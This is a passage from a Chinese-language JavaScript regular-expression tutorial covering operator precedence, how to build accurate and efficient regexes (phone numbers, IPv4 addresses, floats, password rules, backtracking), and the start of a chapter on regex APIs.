b”两个字符连续出现多次，也可以使用非捕获分组<code>(?:ab)+</code>。</p><p><strong>分支</strong>，多个子表达式多选一，比如<code>abc|bcd</code>，表达式匹配”abc”或者”bcd”字符子串。</p><p><strong>反向引用</strong>，比如<code>\2</code>，表示引用第2个分组。</p></blockquote><p>其中涉及到的操作符有：</p><blockquote><p>1.转义符 <code>\</code><br>2.括号和方括号 <code>(...)</code>、<code>(?:...)</code>、<code>(?=...)</code>、<code>(?!...)</code>、<code>[...]</code><br>3.量词限定符 <code>{m}</code>、<code>{m,n}</code>、<code>{m,}</code>、<code>?</code>、<code>*</code>、<code>+</code><br>4.位置和序列 <code>^</code> 、<code>$</code>、 <code>\元字符</code>、 <code>一般字符</code><br>\5. 管道符（竖杠）<code>|</code></p></blockquote><p>上面操作符的优先级从上至下，由高到低。</p><p>这里，我们来分析一个正则：</p><p><code>/ab?(c|de*)+|fg/</code></p><ol><li>由于括号的存在，所以，<code>(c|de*)</code>是一个整体结构。</li><li>在<code>(c|de*)</code>中，注意其中的量词<code>*</code>，因此<code>e*</code>是一个整体结构。</li><li>又因为分支结构“|”优先级最低，因此<code>c</code>是一个整体、而<code>de*</code>是另一个整体。</li><li>同理，整个正则分成了 <code>a</code>、<code>b?</code>、<code>(...)+</code>、<code>f</code>、<code>g</code>。而由于分支的原因，又可以分成<code>ab?(c|de*)+</code>和<code>fg</code>这两部分。</li></ol><p>希望你没被我绕晕，上面的分析可用其<a href="https://link.juejin.im/?target=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fjex.im%2Fregulex%2F%2523%2521embed%253Dfalse%2526flags%253D%2526re%253Dab%25253F%2528c%25257Cde%252A%2529%25252B%25257Cfg" target="_blank" rel="noopener">可视化</a>形式描述如下：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/4bb44a11e383047a027a234ee15663ad?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="2-注意要点"><a href="#2-注意要点" class="headerlink" title="2. 注意要点"></a>2. 注意要点</h3><p>关于结构和操作符，还是有几点需要强调：</p><p><strong>2.1 匹配字符串整体问题</strong></p><p>因为是要匹配整个字符串，我们经常会在正则前后中加上锚字符<code>^</code>和<code>$</code>。</p><p>比如要匹配目标字符串”abc”或者”bcd”时，如果一不小心，就会写成<code>/^abc|bcd$/</code>。</p><p>而位置字符和字符序列优先级要比竖杠高，故其匹配的结构是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/173e8c288f0da4ed89df597551fa80db?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>应该修改成:</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/c3bcb26f1b87e43bab1497322f5107e5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><strong>2.2 量词连缀问题</strong></p><p>假设，要匹配这样的字符串：</p><blockquote><p>\1. 每个字符为a、b、c任选其一</p><p>\2. 字符串的长度是3的倍数</p></blockquote><p>此时正则不能想当然地写成<code>/^[abc]{3}+$/</code>，这样会报错，说<code>+</code>前面没什么可重复的：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a852f1068a8b2051bda5c75882c98f76?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>此时要修改成：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/678d0621feb4bdcea899a6f61628a521?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><strong>2.3 元字符转义问题</strong></p><p>所谓元字符，就是正则中有特殊含义的字符。</p><p>所有结构里，用到的元字符总结如下：</p><blockquote><p><code>**^**</code> <code>**$**</code> <code>**.**</code> <code>*****</code> <code>**+**</code> <code>**?**</code> <code>**|**</code> <code>**\**</code> <code>**/**</code> <code>**(**</code> <code>**)**</code> <code>**[**</code> <code>**]**</code> <code>**{**</code> <code>**}**</code> <code>**=**</code> <code>**!**</code> <code>**:**</code> <code>**-**</code> <code>**,**</code></p></blockquote><p>当匹配上面的字符本身时，可以一律转义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;^$.*+?|\\/[]&#123;&#125;=!:-,&quot;;</span><br><span class="line">var regex = /\^\$\.\*\+\?\|\\\/\[\]\&#123;\&#125;\=\!\:\-\,/;</span><br><span class="line">console.log( regex.test(string) ); </span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其中<code>string</code>中的<code>\</code>字符也要转义的。</p><p>另外，在<code>string</code>中，也可以把每个字符转义，当然，转义后的结果仍是本身：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;^$.*+?|\\/[]&#123;&#125;=!:-,&quot;;</span><br><span class="line">var string2 = &quot;\^\$\.\*\+\?\|\\\/\[\]\&#123;\&#125;\=\!\:\-\,&quot;;</span><br><span class="line">console.log( string == string2 ); </span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>现在的问题是，是不是每个字符都需要转义呢？否，看情况。</p><p><strong>2.3.1 字符组中的元字符</strong></p><p>跟字符组相关的元字符有<code>[]</code>、<code>^</code>、<code>-</code>。因此在会引起歧义的地方进行转义。例如开头的<code>^</code>必须转义，不然会把整个字符组，看成反义字符组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;^$.*+?|\\/[]&#123;&#125;=!:-,&quot;;</span><br><span class="line">var regex = /[\^$.*+?|\\/\[\]&#123;&#125;=!:\-,]/g;</span><br><span class="line">console.log( string.match(regex) );</span><br><span class="line">// =&gt; [&quot;^&quot;, &quot;$&quot;, &quot;.&quot;, &quot;*&quot;, &quot;+&quot;, &quot;?&quot;, &quot;|&quot;, &quot;\&quot;, &quot;/&quot;, &quot;[&quot;, &quot;]&quot;, &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;=&quot;, &quot;!&quot;, &quot;:&quot;, &quot;-&quot;, &quot;,&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.3.2 匹配“[abc]”和“{3,5}”</strong></p><p>我们知道<code>[abc]</code>，是个字符组。如果要匹配字符串”[abc]”时，该怎么办？</p><p>可以写成<code>/\[abc\]/</code>，也可以写成<code>/\[abc]/</code>，测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;[abc]&quot;;</span><br><span class="line">var regex = /\[abc]/g;</span><br><span class="line">console.log( string.match(regex)[0] ); </span><br><span class="line">// =&gt; &quot;[abc]&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>只需要在第一个方括号转义即可，因为后面的方括号构不成字符组，正则不会引发歧义，自然不需要转义。</p><p>同理，要匹配字符串”{3,5}”，只需要把正则写成<code>/\{3,5}/</code>即可。</p><p>另外，我们知道量词有简写形式<code>{m,}</code>，却没有<code>{,n}</code>的情况。虽然后者不构成量词的形式，但此时并不会报错。当然，匹配的字符串也是”{,n}”，测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;&#123;,3&#125;&quot;;</span><br><span class="line">var regex = /&#123;,3&#125;/g;</span><br><span class="line">console.log( string.match(regex)[0] ); </span><br><span class="line">// =&gt; &quot;&#123;,3&#125;&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.3.3 其余情况</strong></p><p>比如<code>=</code> <code>!</code> <code>:</code> <code>-</code> <code>,</code>等符号，只要不在特殊结构中，也不需要转义。</p><p>但是，括号需要前后都转义的，如<code>/\(123\)/</code>。</p><p>至于剩下的<code>^</code> <code>$</code> <code>.</code> <code>*</code> <code>+</code> <code>?</code> <code>|</code> <code>\</code> <code>/</code>等字符，只要不在字符组内，都需要转义的。</p><h3 id="3-案例分析"><a href="#3-案例分析" class="headerlink" title="3. 案例分析"></a>3. 案例分析</h3><p>接下来分析两个例子，一个简单的，一个复杂的。</p><p><strong>3.1 身份证</strong></p><p>正则表达式是：</p><p><code>/^(\d{15}|\d{17}[\dxX])$/</code></p><p>因为竖杠“|”,的优先级最低，所以正则分成了两部分<code>\d{15}</code>和<code>\d{17}[\dxX]</code>。</p><ul><li><code>\d{15}</code>表示15位连续数字。</li><li><code>\d{17}[\dxX]</code>表示17位连续数字，最后一位可以是数字可以大小写字母”x”。</li></ul><p>可视化如下：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/e47d20e904f9b5665942a01fc9d6111d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><strong>3.2 IPV4地址</strong></p><p>正则表达式是：</p><p><code>/^((0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])\.){3}(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])$/</code></p><p>这个正则，看起来非常吓人。但是熟悉优先级后，会立马得出如下的结构：</p><p><code>((...)\.){3}(...)</code></p><p>上面的两个<code>(...)</code>是一样的结构。表示匹配的是3位数字。因此整个结构是</p><blockquote><p>3位数.3位数.3位数.3位数</p></blockquote><p>然后再来分析<code>(...)</code>：</p><p><code>(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])(0{0,2}\d|0?\d{2}|1\d{2}|2[0-4]\d|25[0-5])</code></p><p>它是一个多选结构，分成5个部分：</p><ul><li><code>0{0,2}\d</code>，匹配一位数，包括0补齐的。比如，9、09、009；</li><li><code>0?\d{2}</code>，匹配两位数，包括0补齐的，也包括一位数；</li><li><code>1\d{2}</code>，匹配100到199;</li><li><code>2[0-4]\d</code>，匹配200-249；</li><li><code>25[0-5]</code>，匹配250-255。</li></ul><p>最后来看一下其可视化形式：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/c0a482018c3bfa876b0b5a45ddd67c80?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="第五章小结"><a href="#第五章小结" class="headerlink" title="第五章小结"></a>第五章小结</h3><p>掌握正则表达式中的优先级后，再看任何正则应该都有信心分析下去了。</p><p>至于例子，不一而足，没有写太多。</p><p>这里稍微总结一下，竖杠的优先级最低，即最后运算。</p><p>只要知道这一点，就能读懂大部分正则。</p><p>另外关于元字符转义问题，当自己不确定与否时，尽管去转义，总之是不会错的。</p><h2 id="第6章-正则表达式的构建"><a href="#第6章-正则表达式的构建" class="headerlink" title="第6章 正则表达式的构建"></a>第6章 正则表达式的构建</h2><p>对于一门语言的掌握程度怎么样，可以有两个角度来衡量：读和写。</p><p>不仅要看懂别人的解决方案，也要能独立地解决问题。代码是这样，正则表达式也是这样。</p><p>与“读”相比，“写”往往更为重要，这个道理是不言而喻的。</p><p>对正则的运用，首重就是：如何针对问题，构建一个合适的正则表达式？</p><p>本章就解决该问题，内容包括：</p><ol><li>平衡法则</li><li>构建正则前提</li><li>准确性</li><li>效率</li></ol><h3 id="1-平衡法则"><a href="#1-平衡法则" class="headerlink" title="1. 平衡法则"></a>1. 平衡法则</h3><p>构建正则有一点非常重要，需要做到下面几点的平衡：</p><ol><li>匹配预期的字符串</li><li>不匹配非预期的字符串</li><li>可读性和可维护性</li><li>效率</li></ol><h3 id="2-构建正则前提"><a href="#2-构建正则前提" class="headerlink" title="2. 构建正则前提"></a>2. 构建正则前提</h3><p><strong>2.1 是否能使用正则</strong></p><p>正则太强大了，以至于我们随便遇到一个操作字符串问题时，都会下意识地去想，用正则该怎么做。但我们始终要提醒自己，正则虽然强大，但不是万能的，很多看似很简单的事情，还是做不到的。</p><p>比如匹配这样的字符串：1010010001….</p><p>虽然很有规律，但是只靠正则就是无能为力。</p><p><strong>2.2 是否有必要使用正则</strong></p><p>要认识到正则的局限，不要去研究根本无法完成的任务。同时，也不能走入另一个极端：无所不用正则。能用字符串API解决的简单问题，就不该正则出马。</p><ul><li>比如，从日期中提取出年月日，虽然可以使用正则：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017-07-01&quot;;</span><br><span class="line">var regex = /^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/;</span><br><span class="line">console.log( string.match(regex) );</span><br><span class="line">// =&gt; [&quot;2017-07-01&quot;, &quot;2017&quot;, &quot;07&quot;, &quot;01&quot;, index: 0, input: &quot;2017-07-01&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其实，可以使用字符串的<code>split</code>方法来做，即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;2017-07-01&quot;;</span><br><span class="line">var result = string.split(&quot;-&quot;);</span><br><span class="line">console.log( result );</span><br><span class="line">// =&gt; [&quot;2017&quot;, &quot;07&quot;, &quot;01&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li>比如，判断是否有问号，虽然可以使用：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;?id=xx&amp;act=search&quot;;</span><br><span class="line">console.log( string.search(/\?/) );</span><br><span class="line">// =&gt; 0</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其实，可以使用字符串的<code>indexOf</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;?id=xx&amp;act=search&quot;;</span><br><span class="line">console.log( string.indexOf(&quot;?&quot;) );</span><br><span class="line">// =&gt; 0</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li>比如获取子串，虽然可以使用正则：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;JavaScript&quot;;</span><br><span class="line">console.log( string.match(/.&#123;4&#125;(.+)/)[1] );</span><br><span class="line">// =&gt; Script</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>其实，可以直接使用字符串的<code>substring</code>或<code>substr</code>方法来做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var string = &quot;JavaScript&quot;;</span><br><span class="line">console.log( string.substring(4) );</span><br><span class="line">// =&gt; Script</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>2.3 是否有必要构建一个复杂的正则</strong></p><p>比如密码匹配问题，要求密码长度6-12位，由数字、小写字符和大写字母组成，但必须至少包括2种字符。</p><p>在第2章里，我们写出了正则是：</p><p><code>/(?!^[0-9]{6,12}$)(?!^[a-z]{6,12}$)(?!^[A-Z]{6,12}$)^[0-9A-Za-z]{6,12}$/</code></p><p>其实可以使用多个小正则来做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var regex1 = /^[0-9A-Za-z]&#123;6,12&#125;$/;</span><br><span class="line">var regex2 = /^[0-9]&#123;6,12&#125;$/;</span><br><span class="line">var regex3 = /^[A-Z]&#123;6,12&#125;$/;</span><br><span class="line">var regex4 = /^[a-z]&#123;6,12&#125;$/;</span><br><span class="line">function checkPassword(string) &#123;</span><br><span class="line">if (!regex1.test(string)) return false;</span><br><span class="line">if (regex2.test(string)) return false;</span><br><span class="line">if (regex3.test(string)) return false;</span><br><span class="line">if (regex4.test(string)) return false;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="3-准确性"><a href="#3-准确性" class="headerlink" title="3. 准确性"></a>3. 准确性</h3><p>所谓准确性，就是能匹配预期的目标，并且不匹配非预期的目标。</p><p>这里提到了“预期”二字，那么我们就需要知道目标的组成规则。</p><p>不然没法界定什么样的目标字符串是符合预期的，什么样的又不是符合预期的。</p><p>下面将举例说明，当目标字符串构成比较复杂时，该如何构建正则，并考虑到哪些平衡。</p><p><strong>3.1 匹配固定电话</strong></p><p>比如要匹配如下格式的固定电话号码：</p><blockquote><p>055188888888</p><p>0551-88888888</p><p>(0551)88888888</p></blockquote><p>第一步，了解各部分的模式规则。</p><p>上面的电话，总体上分为区号和号码两部分（不考虑分机号和+86的情形）。</p><p>区号是0开头的3到4位数字，对应的正则是：<code>0\d{2,3}</code></p><p>号码是非0开头的7到8位数字，对应的正则是：<code>[1-9]\d{6,7}</code></p><p>因此，匹配055188888888的正则是：<code>/^0\d{2,3}[1-9]\d{6,7}$/</code></p><p>匹配0551-88888888的正则是：<code>/^0\d{2,3}-[1-9]\d{6,7}$/</code></p><p>匹配(0551)88888888的正则是：<code>/^\(0\d{2,3}\)[1-9]\d{6,7}$/</code></p><p>第二步，明确形式关系。</p><p>这三者情形是或的关系，可以构建分支：</p><p><code>/^0\d{2,3}[1-9]\d{6,7}$|^0\d{2,3}-[1-9]\d{6,7}$|^\(0\d{2,3}\)[1-9]\d{6,7}$/</code></p><p>提取公共部分：</p><p><code>/^(0\d{2,3}|0\d{2,3}-|\(0\d{2,3}\))[1-9]\d{6,7}$/</code></p><p>进一步简写：</p><p><code>/^(0\d{2,3}-?|\(0\d{2,3}\))[1-9]\d{6,7}$/</code></p><p>其可视化形式：</p><p><img src="data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg" alt="img"></p><p>上面的正则构建过程略显罗嗦，但是这样做，能保证正则是准确的。</p><p>上述三种情形是或的关系，这一点很重要，不然很容易按字符是否出现的情形把正则写成：</p><p><code>/^\(?0\d{2,3}\)?-?[1-9]\d{6,7}$/</code></p><p>虽然也能匹配上述目标字符串，但也会匹配(0551-88888888这样的字符串。当然，这不是我们想要的。</p><p>其实这个正则也不是完美的，因为现实中，并不是每个3位数和4位数都是一个真实的区号。</p><p>这就是一个平衡取舍问题，一般够用就行。</p><p><strong>3.2 匹配浮点数</strong></p><p>要求匹配如下的格式：</p><blockquote><p>1.23、+1.23、-1.23</p><p>10、+10、-10</p><p>.2、+.2、-.2</p></blockquote><p>可以看出正则分为三部分。</p><p>符号部分：<code>[+-]</code></p><p>整数部分：<code>\d+</code></p><p>小数部分：<code>\.\d+</code></p><p>上述三个部分，并不是全部都出现。如果此时很容易写出如下的正则：</p><p><code>/^[+-]?(\d+)?(\.\d+)?$/</code></p><p>此正则看似没问题，但这个正则也会匹配空字符””。</p><p>因为目标字符串的形式关系不是要求每部分都是可选的。</p><p>要匹配1.23、+1.23、-1.23，可以用<code>/^[+-]?\d+\.\d+$/</code></p><p>要匹配10、+10、-10，可以用<code>/^[+-]?\d+$/</code></p><p>要匹配.2、+.2、-.2，可以用<code>/^[+-]?\.\d+$/</code></p><p>因此整个正则是这三者的或的关系，提取公众部分后是：</p><p><code>/^[+-]?(\d+\.\d+|\d+|\.\d+)$/</code></p><p>其可视化形式是：</p><p><img src="data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg" alt="img"></p><p>如果要求不匹配+.2和-.2，此时正则变成：</p><p><img src="data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg" alt="img"></p><p>当然，<code>/^[+-]?(\d+\.\d+|\d+|\.\d+)$/</code>也不是完美的，我们也是做了些取舍，比如：</p><ul><li>它也会匹配012这样以0开头的整数。如果要求不匹配的话，需要修改整数部分的正则。</li><li>一般进行验证操作之前，都要经过trim和判空。那样的话，也许那个错误正则也就够用了。</li><li>也可以进一步改写成：<code>/^[+-]?(\d+)?(\.)?\d+$/</code>，这样我们就需要考虑可读性和可维护性了。</li></ul><h3 id="4-效率"><a href="#4-效率" class="headerlink" title="4. 效率"></a>4. 效率</h3><p>保证了准确性后，才需要是否要考虑要优化。大多数情形是不需要优化的，除非运行的非常慢。什么情形正则表达式运行才慢呢？我们需要考察正则表达式的运行过程（原理）。</p><p>正则表达式的运行分为如下的阶段：</p><ol><li>编译</li><li>设定起始位置</li><li>尝试匹配</li><li>匹配失败的话，从下一位开始继续第3步</li><li>最终结果：匹配成功或失败</li></ol><p>下面以代码为例，来看看这几个阶段都做了什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d+/g;</span><br><span class="line">console.log( regex.lastIndex, regex.exec(&quot;123abc34def&quot;) );</span><br><span class="line">console.log( regex.lastIndex, regex.exec(&quot;123abc34def&quot;) );</span><br><span class="line">console.log( regex.lastIndex, regex.exec(&quot;123abc34def&quot;) );</span><br><span class="line">console.log( regex.lastIndex, regex.exec(&quot;123abc34def&quot;) );</span><br><span class="line">// =&gt; 0 [&quot;123&quot;, index: 0, input: &quot;123abc34def&quot;]</span><br><span class="line">// =&gt; 3 [&quot;34&quot;, index: 6, input: &quot;123abc34def&quot;]</span><br><span class="line">// =&gt; 8 null</span><br><span class="line">// =&gt; 0 [&quot;123&quot;, index: 0, input: &quot;123abc34def&quot;]</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>具体分析如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d+/g;复制代码</span><br></pre></td></tr></table></figure><p>当生成一个正则时，引擎会对其进行编译。报错与否出现这这个阶段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regex.exec(&quot;123abc34def&quot;)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>当尝试匹配时，需要确定从哪一位置开始匹配。一般情形都是字符串的开头，即第0位。</p><p>但当使用<code>test</code>和<code>exec</code>方法，且正则有<code>g</code>时，起始位置是从正则对象的<code>lastIndex</code>属性开始。</p><p>因此第一次<code>exec</code>是从第0位开始，而第二次是从3开始的。</p><p>设定好起始位置后，就开始尝试匹配了。</p><p>比如第一次<code>exec</code>，从0开始，去尝试匹配，并且成功地匹配到3个数字。此时结束时的下标是2，因此下一次的起始位置是3。</p><p>而第二次，起始下标是3，但第3个字符是“a”，并不是数字。但此时并不会直接报匹配失败，而是移动到下一位置，即从第4位开始继续尝试匹配，但该字符是b，也不是数字。再移动到下一位，是c仍不行，再移动一位是数字3，此时匹配到了两位数字34。此时，下一次匹配的位置是d的位置，即第8位。</p><p>第三次，是从第8位开始匹配，直到试到最后一位，也没发现匹配的，因此匹配失败，返回<code>null</code>。同时设置<code>lastIndex</code>为0，即，如要再尝试匹配的话，需从头开始。</p><p>从上面可以看出，匹配会出现效率问题，主要出现在上面的第3阶段和第4阶段。</p><p>因此，主要优化手法也是针对这两阶段的。</p><p><strong>4.1 使用具体型字符组来代替通配符，来消除回溯</strong></p><p>而在第三阶段，最大的问题就是回溯。</p><p>例如，匹配双引用号之间的字符。如，匹配字符串123”abc”456中的”abc”。</p><p>如果正则用的是：<code>/&quot;.*&quot;/</code>，，会在第3阶段产生4次回溯（粉色表示<code>.*</code>匹配的内容）：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/5b677f04f2b8d5d776060cea3b045863?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>如果正则用的是：<code>/&quot;.*?&quot;/</code>，会产生2次回溯（粉色表示<code>.*?</code>匹配的内容）：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a064ff019c3c6cdde6005b6c83b60e7b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>因为回溯的存在，需要引擎保存多种可能中未尝试过的状态，以便后续回溯时使用。注定要占用一定的内存。</p><p>此时要使用具体化的字符组，来代替通配符<code>.</code>，以便消除不必要的字符，此时使用正则<code>/&quot;[^&quot;]*&quot;/</code>，即可。</p><p><strong>4.2 使用非捕获型分组</strong></p><p>因为括号的作用之一是，可以捕获分组和分支里的数据。那么就需要内存来保存它们。</p><p>当我们不需要使用分组引用和反向引用时，此时可以使用非捕获分组。例如：</p><p><code>/^[+-]?(\d+\.\d+|\d+|\.\d+)$/</code></p><p>可以修改成：</p><p><code>/^[+-]?(?:\d+\.\d+|\d+|\.\d+)$/</code></p><p><strong>4.3 独立出确定字符</strong></p><p>例如<code>/a+/</code>，可以修改成<code>/aa*/</code>。</p><p>因为后者能比前者多确定了字符a。这样会在第四步中，加快判断是否匹配失败，进而加快移位的速度。</p><p><strong>4.4 提取分支公共部分</strong></p><p>比如/<code>^abc|^def/</code>，修改成<code>/^(?:abc|def)/</code>。</p><p>又比如<code>/this|that/</code>，修改成<code>/th(?:is|at)/</code>。</p><p>这样做，可以减少匹配过程中可消除的重复。</p><p><strong>4.5 减少分支的数量，缩小它们的范围</strong></p><p><code>/red|read/</code>，可以修改成<code>/rea?d/</code>。此时分支和量词产生的回溯的成本是不一样的。但这样优化后，可读性会降低的。</p><h3 id="第六章小结"><a href="#第六章小结" class="headerlink" title="第六章小结"></a>第六章小结</h3><p>本章涉及的内容并不多。</p><p>一般情况下，针对某问题能写出一个满足需求的正则，基本上就可以了。</p><p>至于准确性和效率方面的追求，纯属看个人要求了。我觉得够用就行了。</p><p>关于准确性，本章关心的是最常用的解决思路：</p><p>针对每种情形，分别写出正则，然用分支把他们合并在一起，再提取分支公共部分，就能得到准确的正则。</p><p>至于优化，本章没有为了凑数，去写一大堆。了解了匹配原理，常见的优化手法也就这么几种。</p><h2 id="第七章-正则表达式编程"><a href="#第七章-正则表达式编程" class="headerlink" title="第七章 正则表达式编程"></a>第七章 正则表达式编程</h2><p>什么叫知识，能指导我们实践的东西才叫知识。</p><p>学习一样东西，如果不能使用，最多只能算作纸上谈兵。正则表达式的学习，也不例外。</p><p>掌握了正则表达式的语法后，下一步，也是关键的一步，就是在真实世界中使用它。</p><p>那么如何使用正则表达式呢？有哪些关键的点呢？本章就解决这个问题。</p><p>内容包括：</p><ol><li>正则表达式的四种操作</li><li>相关API注意要点</li><li>真实案例</li></ol><h3 id="1-正则表达式的四种操作"><a href="#1-正则表达式的四种操作" class="headerlink" title="1. 正则表达式的四种操作"></a>1. 正则表达式的四种操作</h3><p>正则表达式是匹配模式，不管如何使用正则表达式，万变不离其宗，都需要先“匹配”。</p><p>有了匹配这一基本操作后，才有其他的操作：验证、切分、提取、替换。</p><p>进行任何相关操作，也需要宿主引擎相关API的配合使用。当然，在JS中，相关API也不多。</p><p><strong>1.1 验证</strong></p><p>验证是正则表达式最直接的应用，比如表单验证。</p><p>在说验证之前，先要说清楚匹配是什么概念。</p><p>所谓匹配，就是看目标字符串里是否有满足匹配的子串。因此，“匹配”的本质就是“查找”。</p><p>有没有匹配，是不是匹配上，判断是否的操作，即称为“验证”。</p><p>这里举一个例子，来看看如何使用相关API进行验证操作的。</p><p>比如，判断一个字符串中是否有数字。</p><ul><li>使用<code>search</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d/;</span><br><span class="line">var string = &quot;abc123&quot;;</span><br><span class="line">console.log( !!~string.search(regex) );</span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li>使用<code>test</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var regex = /\d/;</span><br><span class="line">var string = &quot;abc123&quot;;</span><br><span class="line">console.log( regex.test(string) );</span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li>使用<code>match</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 